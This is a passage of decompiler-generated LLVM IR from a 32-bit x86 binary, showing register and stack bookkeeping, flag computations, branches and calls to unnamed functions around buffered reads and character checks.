  %v1_8049327 = add i32 %v1_8049325, 76
  %v2_8049327 = inttoptr i32 %v1_8049327 to i32*
  %v3_8049327 = load i32, i32* %v2_8049327, align 4
  store i32 %v3_8049327, i32* %edx.global-to-local, align 4
  %v0_804932b = load i32, i32* %eax.global-to-local, align 4
  %v2_804932b = add i32 %v3_8049327, 1472
  %v3_804932b = add i32 %v2_804932b, %v0_804932b
  store i32 %v3_804932b, i32* %eax.global-to-local, align 4
  %v2_8049332 = add i32 %v1_8049325, -12
  %v3_8049332 = inttoptr i32 %v2_8049332 to i32*
  store i32 %v3_804932b, i32* %v3_8049332, align 4
  %v0_8049333 = load i32, i32* @esi, align 4
  %v2_8049333 = add i32 %v1_8049325, -16
  %v3_8049333 = inttoptr i32 %v2_8049333 to i32*
  store i32 %v0_8049333, i32* %v3_8049333, align 4
  %v0_8049334 = call i32 @function_8052010()
  store i32 %v0_8049334, i32* %eax.global-to-local, align 4
  %v0_8049339 = load i32, i32* @esp, align 4
  %v1_8049339 = add i32 %v0_8049339, 16
  %v3_804933c = trunc i32 %v0_8049334 to i8
  %v4_804933c = icmp eq i8 %v3_804933c, 0
  store i1 %v4_804933c, i1* %zf.global-to-local, align 1
  %v1_804933e = icmp eq i1 %v4_804933c, false
  br i1 %v1_804933e, label %dec_label_pc_8049301, label %dec_label_pc_8049340

dec_label_pc_8049340:                             ; preds = %dec_label_pc_8049322
  %v1_8049340 = add i32 %v0_8049339, 20916
  %v2_8049340 = inttoptr i32 %v1_8049340 to i32*
  %v3_8049340 = load i32, i32* %v2_8049340, align 4
  store i32 %v3_8049340, i32* %eax.global-to-local, align 4
  %v1_8049347 = add i32 %v0_8049339, 108
  %v2_8049347 = inttoptr i32 %v1_8049347 to i32*
  %v3_8049347 = load i32, i32* %v2_8049347, align 4
  store i32 %v3_8049347, i32* %ecx.global-to-local, align 4
  %v1_804934b = add i32 %v3_8049340, 1
  store i32 %v1_804934b, i32* %eax.global-to-local, align 4
  store i32 %v1_804934b, i32* %v2_8049340, align 4
  %v0_8049353 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049353 = add i32 %v0_8049353, 16
  %v2_8049353 = inttoptr i32 %v1_8049353 to i32*
  %v3_8049353 = load i32, i32* %v2_8049353, align 4
  %v4_8049353 = load i32, i32* %eax.global-to-local, align 4
  %v5_8049353 = sub i32 %v3_8049353, %v4_8049353
  %v11_8049353 = xor i32 %v4_8049353, %v3_8049353
  %v12_8049353 = xor i32 %v5_8049353, %v3_8049353
  %v13_8049353 = and i32 %v12_8049353, %v11_8049353
  %v14_8049353 = icmp slt i32 %v13_8049353, 0
  %v15_8049353 = icmp eq i32 %v5_8049353, 0
  store i1 %v15_8049353, i1* %zf.global-to-local, align 1
  %v16_8049353 = icmp slt i32 %v5_8049353, 0
  %v3_8049356 = icmp eq i1 %v16_8049353, %v14_8049353
  %v4_8049356 = icmp eq i1 %v15_8049353, false
  %v5_8049356 = and i1 %v4_8049356, %v3_8049356
  br i1 %v5_8049356, label %dec_label_pc_8049322, label %dec_label_pc_8049358

dec_label_pc_8049358:                             ; preds = %dec_label_pc_8049340, %dec_label_pc_804930a
  %v0_8049358 = load i32, i32* @esp, align 4
  %v9_8049358 = icmp eq i32 %v0_8049358, 12
  store i1 %v9_8049358, i1* %zf.global-to-local, align 1
  %v0_804935b = load i32, i32* @esi, align 4
  %v2_804935b = add i32 %v0_8049358, -16
  %v3_804935b = inttoptr i32 %v2_804935b to i32*
  store i32 %v0_804935b, i32* %v3_804935b, align 4
  %v2_804935c = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_804935c, i32* %eax.global-to-local, align 4
  %v0_8049361 = load i32, i32* @esp, align 4
  %v1_8049361 = add i32 %v0_8049361, 16
  %v1_8049364 = add i32 %v2_804935c, -127
  %v6_8049364 = sub i32 126, %v2_804935c
  %v7_8049364 = and i32 %v6_8049364, %v2_804935c
  %v8_8049364 = icmp slt i32 %v7_8049364, 0
  %v9_8049364 = icmp eq i32 %v1_8049364, 0
  store i1 %v9_8049364, i1* %zf.global-to-local, align 1
  %v10_8049364 = icmp slt i32 %v1_8049364, 0
  %v3_8049367 = icmp eq i1 %v10_8049364, %v8_8049364
  %v4_8049367 = icmp eq i1 %v9_8049364, false
  %v5_8049367 = and i1 %v4_8049367, %v3_8049367
  br i1 %v5_8049367, label %dec_label_pc_8049301, label %dec_label_pc_8049369

dec_label_pc_8049369:                             ; preds = %dec_label_pc_8049358
  %v0_8049369 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049369 = add i32 %v0_8049361, 12
  %v3_8049369 = inttoptr i32 %v2_8049369 to i32*
  store i32 %v0_8049369, i32* %v3_8049369, align 4
  %v0_804936a = load i32, i32* %ecx.global-to-local, align 4
  %v2_804936a = add i32 %v0_8049361, 8
  %v3_804936a = inttoptr i32 %v2_804936a to i32*
  store i32 %v0_804936a, i32* %v3_804936a, align 4
  %v0_804936b = load i32, i32* @esi, align 4
  %v2_804936b = add i32 %v0_8049361, 4
  %v3_804936b = inttoptr i32 %v2_804936b to i32*
  store i32 %v0_804936b, i32* %v3_804936b, align 4
  %v1_804936c = add i32 %v0_8049361, 108
  %v2_804936c = inttoptr i32 %v1_804936c to i32*
  %v3_804936c = load i32, i32* %v2_804936c, align 4
  store i32 %v3_804936c, i32* %edx.global-to-local, align 4
  %v1_8049370 = add i32 %v0_8049361, 92
  %v2_8049370 = inttoptr i32 %v1_8049370 to i32*
  %v3_8049370 = load i32, i32* %v2_8049370, align 4
  store i32 %v3_8049370, i32* %ecx.global-to-local, align 4
  %v1_8049374 = add i32 %v3_804936c, 16
  %v2_8049374 = inttoptr i32 %v1_8049374 to i32*
  %v3_8049374 = load i32, i32* %v2_8049374, align 4
  %v2_8049377 = mul i32 %v3_8049374, 128
  %v3_8049377 = icmp eq i32 %v2_8049377, 0
  store i1 %v3_8049377, i1* %zf.global-to-local, align 1
  %v2_804937a = add i32 %v3_8049370, 1472
  %v3_804937a = add i32 %v2_804937a, %v2_8049377
  store i32 %v3_804937a, i32* %eax.global-to-local, align 4
  %v3_8049381 = inttoptr i32 %v0_8049361 to i32*
  store i32 %v3_804937a, i32* %v3_8049381, align 4
  %v3_8049382 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049382, i32* %eax.global-to-local, align 4
  %v0_8049387 = load i32, i32* @esp, align 4
  %v1_8049387 = add i32 %v0_8049387, 108
  %v2_8049387 = inttoptr i32 %v1_8049387 to i32*
  %v3_8049387 = load i32, i32* %v2_8049387, align 4
  store i32 %v3_8049387, i32* %eax.global-to-local, align 4
  %v1_804938e = add i32 %v3_8049387, 16
  %v2_804938e = inttoptr i32 %v1_804938e to i32*
  %v3_804938e = load i32, i32* %v2_804938e, align 4
  %v1_8049391 = add i32 %v3_804938e, 1
  %v8_8049391 = icmp eq i32 %v1_8049391, 0
  store i1 %v8_8049391, i1* %zf.global-to-local, align 1
  store i32 %v1_8049391, i32* %edx.global-to-local, align 4
  store i32 %v1_8049391, i32* %v2_804938e, align 4
  %v0_8049301.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049301

dec_label_pc_804939a:                             ; preds = %dec_label_pc_804921b
  %v0_804939a = load i32, i32* %eax.global-to-local, align 4
  %v1_804939a = add i32 %v0_804939a, 1
  %v8_804939a = icmp eq i32 %v1_804939a, 0
  store i1 %v8_804939a, i1* %zf.global-to-local, align 1
  store i32 %v1_804939a, i32* %eax.global-to-local, align 4
  %v0_804939b = load i32, i32* @esi, align 4
  %v2_804939b = add i32 %v0_804939b, %v1_804939a
  store i32 %v2_804939b, i32* %ecx.global-to-local, align 4
  %v2_804939e = add i32 %v0_804923c, 124
  %v3_804939e = inttoptr i32 %v2_804939e to i32*
  store i32 %v2_804939b, i32* %v3_804939e, align 4
  %v0_804924d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804924d

dec_label_pc_80493a7:                             ; preds = %dec_label_pc_8048547
  %v1_80493a7 = add i32 %v0_80485a5, -1440
  %v2_80493a7 = inttoptr i32 %v1_80493a7 to i32*
  %v3_80493a7 = load i32, i32* %v2_80493a7, align 4
  %v1_80493af = urem i32 %v3_80493a7, 32
  store i32 %v1_80493af, i32* %eax.global-to-local, align 4
  %v2_80493b2 = udiv i32 %v3_80493a7, 32
  store i32 %v2_80493b2, i32* %edx.global-to-local, align 4
  %v0_80493b5 = load i32, i32* @esp, align 4
  %v2_80493b5 = mul nuw nsw i32 %v2_80493b2, 4
  %v3_80493b5 = add nuw nsw i32 %v2_80493b5, 20740
  %v4_80493b5 = add i32 %v3_80493b5, %v0_80493b5
  %v5_80493b5 = inttoptr i32 %v4_80493b5 to i32*
  %v6_80493b5 = load i32, i32* %v5_80493b5, align 4
  %v9_80493b5 = shl i32 1, %v1_80493af
  %v12_80493b5 = or i32 %v6_80493b5, %v9_80493b5
  store i32 %v12_80493b5, i32* %v5_80493b5, align 4
  %v0_80493bd = load i32, i32* @esi, align 4
  %v1_80493bd = add i32 %v0_80493bd, -1440
  %v2_80493bd = inttoptr i32 %v1_80493bd to i32*
  %v3_80493bd = load i32, i32* %v2_80493bd, align 4
  store i32 %v3_80493bd, i32* %eax.global-to-local, align 4
  %v1_80493c3 = load i32, i32* @esp, align 4
  %v2_80493c3 = add i32 %v1_80493c3, 72
  %v3_80493c3 = inttoptr i32 %v2_80493c3 to i32*
  %v4_80493c3 = load i32, i32* %v3_80493c3, align 4
  %v5_80493c3 = sub i32 %v3_80493bd, %v4_80493c3
  %v11_80493c3 = xor i32 %v4_80493c3, %v3_80493bd
  %v12_80493c3 = xor i32 %v5_80493c3, %v3_80493bd
  %v13_80493c3 = and i32 %v12_80493c3, %v11_80493c3
  %v14_80493c3 = icmp slt i32 %v13_80493c3, 0
  %v15_80493c3 = icmp eq i32 %v5_80493c3, 0
  store i1 %v15_80493c3, i1* %zf.global-to-local, align 1
  %v16_80493c3 = icmp slt i32 %v5_80493c3, 0
  %v3_80493c7 = icmp ne i1 %v16_80493c3, %v14_80493c3
  %v4_80493c7 = or i1 %v15_80493c3, %v3_80493c7
  br i1 %v4_80493c7, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_80493d2:                             ; preds = %dec_label_pc_804920d, %dec_label_pc_80491e0
  %v0_80493d2 = load i32, i32* @edi, align 4
  %v2_80493d2 = add i32 %v0_8049203, 12
  %v3_80493d2 = inttoptr i32 %v2_80493d2 to i32*
  store i32 %v0_80493d2, i32* %v3_80493d2, align 4
  %v0_80493d3 = load i32, i32* @edi, align 4
  %v2_80493d3 = add i32 %v0_8049203, 8
  %v3_80493d3 = inttoptr i32 %v2_80493d3 to i32*
  store i32 %v0_80493d3, i32* %v3_80493d3, align 4
  %v1_80493d4 = add i32 %v0_8049203, 4
  %v2_80493d4 = inttoptr i32 %v1_80493d4 to i32*
  store i32 0, i32* %v2_80493d4, align 4
  %v2_80493d6 = inttoptr i32 %v0_8049203 to i32*
  store i32 38, i32* %v2_80493d6, align 4
  %v3_80493d8 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80493d8, i32* %eax.global-to-local, align 4
  %v0_80493dd = load i32, i32* @esp, align 4
  %v9_80493dd = icmp eq i32 %v0_80493dd, -12
  store i1 %v9_80493dd, i1* %zf.global-to-local, align 1
  %v2_80493e0 = add i32 %v0_80493dd, 8
  %v3_80493e0 = inttoptr i32 %v2_80493e0 to i32*
  store i32 %v3_80493d8, i32* %v3_80493e0, align 4
  %v1_80493e1 = add i32 %v0_80493dd, 120
  %v2_80493e1 = inttoptr i32 %v1_80493e1 to i32*
  %v3_80493e1 = load i32, i32* %v2_80493e1, align 4
  %v2_80493e5 = add i32 %v0_80493dd, 4
  %v3_80493e5 = inttoptr i32 %v2_80493e5 to i32*
  store i32 %v3_80493e1, i32* %v3_80493e5, align 4
  %v1_80493e6 = add i32 %v0_80493dd, 147
  store i32 %v1_80493e6, i32* @ecx, align 4
  %v3_80493ed = inttoptr i32 %v0_80493dd to i32*
  store i32 %v1_80493e6, i32* %v3_80493ed, align 4
  %v4_80493ee = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80493f3 = load i32, i32* @esp, align 4
  %v1_80493f6 = add i32 %v4_80493ee, 1
  %v8_80493f6 = icmp eq i32 %v1_80493f6, 0
  store i1 %v8_80493f6, i1* %zf.global-to-local, align 1
  store i32 %v1_80493f6, i32* %eax.global-to-local, align 4
  br i1 %v8_80493f6, label %dec_label_pc_8049854, label %dec_label_pc_80493fd

dec_label_pc_80493fd:                             ; preds = %dec_label_pc_80493d2
  %v0_80493fd = load i32, i32* @ebx, align 4
  %v2_80493fd = add i32 %v0_80493f3, 12
  %v3_80493fd = inttoptr i32 %v2_80493fd to i32*
  store i32 %v0_80493fd, i32* %v3_80493fd, align 4
  %v0_80493fe = load i32, i32* @ebx, align 4
  %v2_80493fe = add i32 %v0_80493f3, 8
  %v3_80493fe = inttoptr i32 %v2_80493fe to i32*
  store i32 %v0_80493fe, i32* %v3_80493fe, align 4
  %v1_80493ff = add i32 %v0_80493f3, 4
  %v2_80493ff = inttoptr i32 %v1_80493ff to i32*
  store i32 0, i32* %v2_80493ff, align 4
  %v2_8049401 = inttoptr i32 %v0_80493f3 to i32*
  store i32 38, i32* %v2_8049401, align 4
  %v3_8049403 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049403, i32* %eax.global-to-local, align 4
  %v0_8049408 = load i32, i32* @esp, align 4
  %v9_8049408 = icmp eq i32 %v0_8049408, -12
  store i1 %v9_8049408, i1* %zf.global-to-local, align 1
  %v2_804940b = add i32 %v0_8049408, 8
  %v3_804940b = inttoptr i32 %v2_804940b to i32*
  store i32 %v3_8049403, i32* %v3_804940b, align 4
  %v1_804940c = add i32 %v0_8049408, 120
  %v2_804940c = inttoptr i32 %v1_804940c to i32*
  %v3_804940c = load i32, i32* %v2_804940c, align 4
  store i32 %v3_804940c, i32* @ecx, align 4
  %v2_8049410 = add i32 %v0_8049408, 4
  %v3_8049410 = inttoptr i32 %v2_8049410 to i32*
  store i32 %v3_804940c, i32* %v3_8049410, align 4
  %v1_8049411 = add i32 %v0_8049408, 147
  store i32 %v1_8049411, i32* %eax.global-to-local, align 4
  %v3_8049418 = inttoptr i32 %v0_8049408 to i32*
  store i32 %v1_8049411, i32* %v3_8049418, align 4
  %v4_8049419 = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049419, i32* %eax.global-to-local, align 4
  %v0_804941e = load i32, i32* @esp, align 4
  %v6_804941e = icmp eq i32 %v0_804941e, -16
  store i1 %v6_804941e, i1* %zf.global-to-local, align 1
  store i32 %v4_8049419, i32* %ebx.global-to-local, align 4
  %v3_8049423 = add i32 %v4_8049419, 147
  %v4_8049423 = add i32 %v3_8049423, %v0_804941e
  %v5_8049423 = inttoptr i32 %v4_8049423 to i8*
  %v6_8049423 = load i8, i8* %v5_8049423, align 1
  %v12_8049423 = icmp eq i8 %v6_8049423, 32
  %v1_804942b = zext i1 %v12_8049423 to i32
  %v1_804942e = add i32 %v0_804941e, 147
  store i32 %v1_804942e, i32* %esi.global-to-local, align 4
  store i32 %v1_804942b, i32* %eax.global-to-local, align 4
  %v1_804943a = add i32 %v0_804941e, 12
  %v2_804943a = inttoptr i32 %v1_804943a to i32*
  store i32 2, i32* %v2_804943a, align 4
  %v1_804943c = add i32 %v0_804941e, 8
  %v2_804943c = inttoptr i32 %v1_804943c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v2_804943c, align 4
  %v0_8049441 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049441 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049441 = add i32 %v1_8049441, %v0_8049441
  store i32 %v2_8049441, i32* @ebx, align 4
  %v1_8049443 = add i32 %v0_804941e, 120
  %v2_8049443 = inttoptr i32 %v1_8049443 to i32*
  %v3_8049443 = load i32, i32* %v2_8049443, align 4
  %v2_8049447 = sub i32 %v3_8049443, %v2_8049441
  store i32 %v2_8049447, i32* %eax.global-to-local, align 4
  %v0_8049449 = load i32, i32* %esi.global-to-local, align 4
  %v2_8049449 = add i32 %v0_8049449, %v2_8049441
  %v12_8049449 = icmp eq i32 %v2_8049449, 0
  store i1 %v12_8049449, i1* %zf.global-to-local, align 1
  store i32 %v2_8049449, i32* @esi, align 4
  %v2_804944b = add i32 %v0_804941e, 4
  %v3_804944b = inttoptr i32 %v2_804944b to i32*
  store i32 %v2_8049447, i32* %v3_804944b, align 4
  %v0_804944c = load i32, i32* @esi, align 4
  %v3_804944c = inttoptr i32 %v0_804941e to i32*
  store i32 %v0_804944c, i32* %v3_804944c, align 4
  %v0_804944d = call i32 @function_8051d00()
  store i32 %v0_804944d, i32* %eax.global-to-local, align 4
  %v0_8049452 = load i32, i32* @esp, align 4
  store i32 %v0_804944d, i32* %edx.global-to-local, align 4
  %v10_8049457 = icmp eq i32 %v0_804944d, -1
  store i1 %v10_8049457, i1* %zf.global-to-local, align 1
  br i1 %v10_8049457, label %dec_label_pc_8049854, label %dec_label_pc_8049460

dec_label_pc_8049460:                             ; preds = %dec_label_pc_80493fd
  %v10_8049460 = icmp eq i32 %v0_804944d, 1
  store i1 %v10_8049460, i1* %zf.global-to-local, align 1
  %v7_8049463 = icmp sgt i32 %v0_804944d, 1
  br i1 %v7_8049463, label %dec_label_pc_8049465, label %dec_label_pc_8049468

dec_label_pc_8049465:                             ; preds = %dec_label_pc_8049460
  %v1_8049465 = add i32 %v0_804944d, -2
  %v9_8049465 = icmp eq i32 %v1_8049465, 0
  store i1 %v9_8049465, i1* %zf.global-to-local, align 1
  store i32 %v1_8049465, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049468

dec_label_pc_8049468:                             ; preds = %dec_label_pc_8049460, %dec_label_pc_8049465
  %v0_8049471 = phi i32 [ %v0_804944d, %dec_label_pc_8049460 ], [ %v1_8049465, %dec_label_pc_8049465 ]
  %v1_8049468 = add i32 %v0_8049452, 20920
  %v1_804946f = load i32, i32* @ebx, align 4
  %v2_804946f = add i32 %v1_8049468, %v1_804946f
  %v12_804946f = icmp eq i32 %v2_804946f, 0
  store i1 %v12_804946f, i1* %zf.global-to-local, align 1
  store i32 %v2_804946f, i32* %eax.global-to-local, align 4
  %v1_8049471 = add i32 %v0_8049471, 1
  store i32 %v1_8049471, i32* @ebx, align 4
  %v2_8049474 = add i32 %v0_8049471, -20773
  %v3_8049474 = add i32 %v2_8049474, %v2_804946f
  %v4_8049474 = inttoptr i32 %v3_8049474 to i8*
  store i8 0, i8* %v4_8049474, align 1
  %v0_804947c = load i32, i32* @esp, align 4
  %v1_804947c = add i32 %v0_804947c, -4
  %v2_804947c = inttoptr i32 %v1_804947c to i32*
  store i32 4, i32* %v2_804947c, align 4
  %v1_804947e = add i32 %v0_804947c, -8
  %v2_804947e = inttoptr i32 %v1_804947e to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b2b.15 to i32), i32* %v2_804947e, align 4
  %v0_8049483 = load i32, i32* @ebx, align 4
  %v2_8049483 = add i32 %v0_804947c, -12
  %v3_8049483 = inttoptr i32 %v2_8049483 to i32*
  store i32 %v0_8049483, i32* %v3_8049483, align 4
  %v0_8049484 = load i32, i32* @esi, align 4
  %v2_8049484 = add i32 %v0_804947c, -16
  %v3_8049484 = inttoptr i32 %v2_8049484 to i32*
  store i32 %v0_8049484, i32* %v3_8049484, align 4
  %v0_8049485 = call i32 @function_8051d00()
  store i32 %v0_8049485, i32* @eax, align 4
  %v0_804948a = load i32, i32* @esp, align 4
  %v9_804948d = icmp eq i32 %v0_8049485, 4
  store i1 %v9_804948d, i1* %zf.global-to-local, align 1
  br i1 %v9_804948d, label %dec_label_pc_8049b1d, label %dec_label_pc_8049496

dec_label_pc_8049496:                             ; preds = %dec_label_pc_8049468
  %v1_804948a = add i32 %v0_804948a, 16
  %v0_8049496 = load i32, i32* @esi, align 4
  %v1_8049496 = inttoptr i32 %v0_8049496 to i8*
  %v2_8049496 = load i8, i8* %v1_8049496, align 1
  %v11_8049496 = icmp eq i8 %v2_8049496, 47
  store i1 %v11_8049496, i1* %zf.global-to-local, align 1
  br i1 %v11_8049496, label %dec_label_pc_8049c88, label %dec_label_pc_804949f

dec_label_pc_804949f:                             ; preds = %dec_label_pc_8049cbd, %dec_label_pc_8049c88, %dec_label_pc_8049bdf, %dec_label_pc_8049bbc, %dec_label_pc_8049496, %dec_label_pc_8049c14
  %v0_804949f = phi i32 [ %v1_8049cd2, %dec_label_pc_8049cbd ], [ %v1_8049cb2, %dec_label_pc_8049c88 ], [ %v1_8049c09, %dec_label_pc_8049bdf ], [ %v1_8049bd1, %dec_label_pc_8049bbc ], [ %v1_804948a, %dec_label_pc_8049496 ], [ %v1_8049c29, %dec_label_pc_8049c14 ]
  %v1_804949f = add i32 %v0_804949f, 92
  %v2_804949f = inttoptr i32 %v1_804949f to i32*
  %v3_804949f = load i32, i32* %v2_804949f, align 4
  store i32 %v3_804949f, i32* %edx.global-to-local, align 4
  %v1_80494a3 = add i32 %v3_804949f, -1448
  %v2_80494a3 = inttoptr i32 %v1_80494a3 to i8*
  store i8 1, i8* %v2_80494a3, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_80494af:                             ; preds = %dec_label_pc_8048d81
  %v1_80494af = call i32 @function_8052729(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80494af, i32* %eax.global-to-local, align 4
  %v0_80494b4 = load i32, i32* @esp, align 4
  %v1_80494b4 = add i32 %v0_80494b4, 76
  %v2_80494b4 = inttoptr i32 %v1_80494b4 to i32*
  %v3_80494b4 = load i32, i32* %v2_80494b4, align 4
  store i32 %v3_80494b4, i32* %ecx.global-to-local, align 4
  %v1_80494b8 = add i32 %v0_80494b4, 92
  %v2_80494b8 = inttoptr i32 %v1_80494b8 to i32*
  %v3_80494b8 = load i32, i32* %v2_80494b8, align 4
  store i32 %v3_80494b8, i32* %edx.global-to-local, align 4
  %v1_80494be = add i32 %v3_80494b4, 1472
  store i32 %v1_80494be, i32* @ebp, align 4
  store i32 %v1_80494af, i32* @edi, align 4
  %v1_80494c6 = add i32 %v3_80494b4, 2116
  store i32 %v1_80494c6, i32* @esi, align 4
  %v1_80494cc = add i32 %v3_80494b8, 660
  %v2_80494cc = inttoptr i32 %v1_80494cc to i32*
  %v3_80494cc = load i32, i32* %v2_80494cc, align 4
  %v9_80494cc = icmp eq i32 %v3_80494cc, 1024
  store i1 %v9_80494cc, i1* %zf.global-to-local, align 1
  br i1 %v9_80494cc, label %dec_label_pc_8049605, label %dec_label_pc_80494dc

dec_label_pc_80494dc:                             ; preds = %dec_label_pc_80494af, %dec_label_pc_8049605, %dec_label_pc_80495f1
  %v0_80494dc = phi i32 [ %v0_80495e0, %dec_label_pc_80495f1 ], [ %v0_80494b4, %dec_label_pc_80494af ], [ %v0_80494dc.pre.pre, %dec_label_pc_8049605 ]
  %v1_80494dc = add i32 %v0_80494dc, 92
  %v2_80494dc = inttoptr i32 %v1_80494dc to i32*
  %v3_80494dc = load i32, i32* %v2_80494dc, align 4
  store i32 %v3_80494dc, i32* %eax.global-to-local, align 4
  %v0_80494e0 = load i32, i32* @edi, align 4
  %v1_80494e0 = inttoptr i32 %v0_80494e0 to i32*
  store i32 0, i32* %v1_80494e0, align 4
  %v0_80494e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80494e6 = add i32 %v0_80494e6, 660
  %v2_80494e6 = inttoptr i32 %v1_80494e6 to i32*
  %v3_80494e6 = load i32, i32* %v2_80494e6, align 4
  store i32 %v3_80494e6, i32* %edx.global-to-local, align 4
  %v2_80494f1 = sub i32 1024, %v3_80494e6
  %v12_80494f1 = icmp eq i32 %v2_80494f1, 0
  store i1 %v12_80494f1, i1* %zf.global-to-local, align 1
  store i32 %v2_80494f1, i32* %eax.global-to-local, align 4
  %v0_80494f3 = load i32, i32* @esp, align 4
  %v1_80494f3 = add i32 %v0_80494f3, -4
  %v2_80494f3 = inttoptr i32 %v1_80494f3 to i32*
  store i32 16384, i32* %v2_80494f3, align 4
  %v0_80494f8 = load i32, i32* @esi, align 4
  %v1_80494f8 = load i32, i32* %edx.global-to-local, align 4
  %v2_80494f8 = add i32 %v1_80494f8, %v0_80494f8
  store i32 %v2_80494f8, i32* %edx.global-to-local, align 4
  %v0_80494fb = load i32, i32* %eax.global-to-local, align 4
  %v2_80494fb = add i32 %v0_80494f3, -8
  %v3_80494fb = inttoptr i32 %v2_80494fb to i32*
  store i32 %v0_80494fb, i32* %v3_80494fb, align 4
  %v0_80494fc = load i32, i32* %edx.global-to-local, align 4
  %v2_80494fc = add i32 %v0_80494f3, -12
  %v3_80494fc = inttoptr i32 %v2_80494fc to i32*
  store i32 %v0_80494fc, i32* %v3_80494fc, align 4
  %v1_80494fd = add i32 %v0_80494f3, 92
  %v2_80494fd = inttoptr i32 %v1_80494fd to i32*
  %v3_80494fd = load i32, i32* %v2_80494fd, align 4
  store i32 %v3_80494fd, i32* %edx.global-to-local, align 4
  %v1_8049501 = add i32 %v3_80494fd, -1452
  %v2_8049501 = inttoptr i32 %v1_8049501 to i32*
  %v3_8049501 = load i32, i32* %v2_8049501, align 4
  store i32 %v3_8049501, i32* %eax.global-to-local, align 4
  %v2_8049507 = add i32 %v0_80494f3, -16
  %v3_8049507 = inttoptr i32 %v2_8049507 to i32*
  store i32 %v3_8049501, i32* %v3_8049507, align 4
  %v0_8049508 = call i32 @function_80528be()
  store i32 %v0_8049508, i32* %eax.global-to-local, align 4
  %v0_804950d = load i32, i32* @esp, align 4
  %v1_804950d = add i32 %v0_804950d, 16
  %v1_8049510 = icmp eq i32 %v0_8049508, 0
  store i1 %v1_8049510, i1* %zf.global-to-local, align 1
  br i1 %v1_8049510, label %dec_label_pc_8048e44, label %dec_label_pc_8049518

dec_label_pc_8049518:                             ; preds = %dec_label_pc_80494dc
  %v10_8049518 = icmp eq i32 %v0_8049508, -1
  store i1 %v10_8049518, i1* %zf.global-to-local, align 1
  br i1 %v10_8049518, label %dec_label_pc_8049b0f, label %dec_label_pc_8049521

dec_label_pc_8049521:                             ; preds = %dec_label_pc_8049518
  %v1_8049521 = add i32 %v0_804950d, 108
  %v2_8049521 = inttoptr i32 %v1_8049521 to i32*
  %v3_8049521 = load i32, i32* %v2_8049521, align 4
  store i32 %v3_8049521, i32* %edx.global-to-local, align 4
  %v1_8049525 = add i32 %v3_8049521, 660
  %v2_8049525 = inttoptr i32 %v1_8049525 to i32*
  %v3_8049525 = load i32, i32* %v2_8049525, align 4
  %v2_804952b = add i32 %v3_8049525, %v0_8049508
  %v12_804952b = icmp eq i32 %v2_804952b, 0
  store i1 %v12_804952b, i1* %zf.global-to-local, align 1
  store i32 %v2_804952b, i32* %ecx.global-to-local, align 4
  store i32 %v2_804952b, i32* %v2_8049525, align 4
  %v0_8049533 = load i32, i32* @esp, align 4
  %v1_8049533 = add i32 %v0_8049533, 116
  %v2_8049533 = inttoptr i32 %v1_8049533 to i32*
  %v3_8049533 = load i32, i32* %v2_8049533, align 4
  store i32 %v3_8049533, i32* %ecx.global-to-local, align 4
  %v1_8049537 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049537 = add i32 %v1_8049537, -1444
  %v3_8049537 = inttoptr i32 %v2_8049537 to i32*
  store i32 %v3_8049533, i32* %v3_8049537, align 4
  %v0_80495d1.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80495d1

dec_label_pc_8049542:                             ; preds = %dec_label_pc_80495d1
  %v1_8049542 = add i32 %v0_8049542, 660
  %v2_8049542 = inttoptr i32 %v1_8049542 to i32*
  %v3_8049542 = load i32, i32* %v2_8049542, align 4
  store i32 %v3_8049542, i32* %edx.global-to-local, align 4
  store i32 %v3_80495d1, i32* @ebx, align 4
  %v2_804954a = sub i32 %v3_80495d1, %v3_8049542
  %v8_804954a = xor i32 %v3_8049542, %v3_80495d1
  %v9_804954a = xor i32 %v2_804954a, %v3_80495d1
  %v10_804954a = and i32 %v9_804954a, %v8_804954a
  %v11_804954a = icmp slt i32 %v10_804954a, 0
  %v12_804954a = icmp eq i32 %v2_804954a, 0
  store i1 %v12_804954a, i1* %zf.global-to-local, align 1
  %v13_804954a = icmp slt i32 %v2_804954a, 0
  %v3_804954c = icmp ne i1 %v13_804954a, %v11_804954a
  %v4_804954c = or i1 %v12_804954a, %v3_804954c
  br i1 %v4_804954c, label %dec_label_pc_8049550, label %dec_label_pc_804954e

dec_label_pc_804954e:                             ; preds = %dec_label_pc_8049542
  store i32 %v3_8049542, i32* @ebx, align 4
  br label %dec_label_pc_8049550

dec_label_pc_8049550:                             ; preds = %dec_label_pc_8049542, %dec_label_pc_804954e
  %v1_8049554 = phi i32 [ %v3_80495d1, %dec_label_pc_8049542 ], [ %v3_8049542, %dec_label_pc_804954e ]
  %v0_8049550 = load i32, i32* @esp, align 4
  %v1_8049550 = add i32 %v0_8049550, 92
  %v2_8049550 = inttoptr i32 %v1_8049550 to i32*
  %v3_8049550 = load i32, i32* %v2_8049550, align 4
  store i32 %v3_8049550, i32* %edx.global-to-local, align 4
  %v2_8049554 = sub i32 %v3_80495d1, %v1_8049554
  store i32 %v2_8049554, i32* %eax.global-to-local, align 4
  %v2_8049556 = add i32 %v3_8049550, 12
  %v3_8049556 = inttoptr i32 %v2_8049556 to i32*
  store i32 %v2_8049554, i32* %v3_8049556, align 4
  %v0_8049559 = load i32, i32* %edx.global-to-local, align 4
